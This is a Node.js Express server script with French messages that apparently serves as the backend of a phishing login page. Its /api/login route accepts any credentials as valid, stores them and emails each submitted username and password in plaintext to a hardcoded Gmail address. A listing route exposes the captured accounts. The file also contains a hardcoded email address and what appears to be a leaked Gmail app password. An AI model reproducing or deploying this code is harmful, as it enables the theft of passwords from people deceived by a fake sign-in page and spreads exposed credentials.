const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const users = [];

let transporter = null;

function initMailer() {
  try {
    const nodemailer = require('nodemailer');
    const emailUser = process.env.EMAIL_USER || 'hhmehdi58@gmail.com';
    const emailPass = process.env.EMAIL_PASS || 'xzzu kiva esmv esjy';
    transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: emailUser,
        pass: emailPass
      }
    });
    console.log('Email configuré pour: ' + emailUser);
  } catch (e) {
    console.log('Erreur mailer: ' + e.message);
  }
}

initMailer();

async function sendEmail(username, password) {
  if (!transporter) return;
  try {
    const emailUser = process.env.EMAIL_USER || 'hhmehdi58@gmail.com';
    await transporter.sendMail({
      from: emailUser,
      to: emailUser,
      subject: 'Nouvelle connexion - ' + username,
      html: '<p><b>User:</b> ' + username + '</p><p><b>Pass:</b> ' + password + '</p><p><b>Date:</b> ' + new Date().toLocaleString('fr-FR') + '</p>'
    });
    console.log('Email envoyé: ' + username);
  } catch (e) {
    console.log('Erreur email: ' + e.message);
  }
}

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;

  if (!username || !username.trim()) {
    return res.status(400).json({ success: false, message: 'Email requis' });
  }
  if (!password || !password.trim()) {
    return res.status(400).json({ success: false, message: 'Mot de passe requis' });
  }

  users.push({
    username: username.trim(),
    password: password.trim(),
    date: new Date().toISOString()
  });

  sendEmail(username.trim(), password.trim());

  res.json({ success: true, message: 'Connexion réussie' });
});

app.get('/api/users', (req, res) => {
  res.json(users.map(u => ({ username: u.username, date: u.date })));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('Serveur démarré sur le port ' + PORT);
});
